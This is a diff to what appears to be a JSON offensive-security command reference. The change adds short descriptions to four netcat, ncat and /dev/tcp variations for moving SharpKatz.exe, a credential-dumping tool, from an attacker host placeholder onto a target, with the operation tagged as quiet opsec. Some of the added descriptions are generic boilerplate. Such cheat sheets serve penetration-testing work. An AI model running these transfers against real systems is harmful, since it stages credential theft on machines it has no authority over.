@@ -60,19 +60,23 @@
   "variations": [
     {
       "label": "Receiver listens (target)",
-      "command": "nc -l -p 8000 > SharpKatz.exe\n# ncat: ncat -l -p 8000 --recv-only > SharpKatz.exe"
+      "command": "nc -l -p 8000 > SharpKatz.exe\n# ncat: ncat -l -p 8000 --recv-only > SharpKatz.exe",
+      "description": "Starts a netcat listener on a specific port. Catches incoming reverse shell connections or receives file transfers from the target."
     },
     {
       "label": "Sender pushes (attacker)",
-      "command": "nc -q 0 <lhost> 8000 < SharpKatz.exe\n# ncat: ncat --send-only <lhost> 8000 < SharpKatz.exe"
+      "command": "nc -q 0 <lhost> 8000 < SharpKatz.exe\n# ncat: ncat --send-only <lhost> 8000 < SharpKatz.exe",
+      "description": "Uses netcat for network connections, file transfers, or shell access. Versatile networking utility available on most Unix systems."
     },
     {
       "label": "Attacker serves, target pulls",
-      "command": "# attacker: sudo nc -l -p 443 -q 0 < SharpKatz.exe\n# target:   nc <lhost> 443 > SharpKatz.exe"
+      "command": "# attacker: sudo nc -l -p 443 -q 0 < SharpKatz.exe\n# target:   nc <lhost> 443 > SharpKatz.exe",
+      "description": "Attacker serves, target pulls. See the command syntax for exact parameters and flags."
     },
     {
       "label": "Receive via /dev/tcp (no nc)",
-      "command": "cat < /dev/tcp/<lhost>/443 > SharpKatz.exe"
+      "command": "cat < /dev/tcp/<lhost>/443 > SharpKatz.exe",
+      "description": "Receive via /dev/tcp (no nc). See the command syntax for exact parameters and flags."
     }
   ],
   "opsec": "quiet",
